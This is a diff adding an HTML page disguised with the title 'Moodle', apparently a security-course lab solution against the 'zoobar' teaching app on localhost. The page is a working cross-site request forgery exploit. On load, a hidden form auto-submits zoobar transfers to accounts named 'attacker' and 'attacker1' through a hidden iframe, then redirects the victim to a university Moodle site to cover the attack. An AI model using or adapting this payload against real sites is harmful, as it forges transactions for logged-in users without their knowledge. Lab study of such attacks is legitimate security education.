@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>
+          Moodle
+        </title>
+    </head>
+    <body>
+      <iframe name="mikasa" style="visibility:hidden;" src="http://localhost:8080/zoobar/index.cgi/transfer"> </iframe>
+
+      <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"  target="mikasa" onsubmit="setTimeout(function(){moodle(); return false;}, 1000);" style="visibility:hidden;">
+        <input id="bars" name="zoobars"  type="text" value=1 size=5>
+        <input id="receiver" name=recipient type=text value="attacker" size=10>
+        <input id="attack" type="submit" name="submission" value="Send">
+      </form>
+
+      <script>
+        var i = 1;
+        function moodle() {
+          if (i == 1)
+          {
+            i--;
+            document.getElementById('bars').value = 9;
+            document.getElementById('receiver').value = "attacker1";
+            document.getElementById('attack').click();
+          }
+          else if (i == 0){
+            window.location.href = 'http://moodle.cse.iitk.ac.in/';
+          }
+        }
+        document.getElementById('attack').click();
+      </script>
+    </body>
+</html>
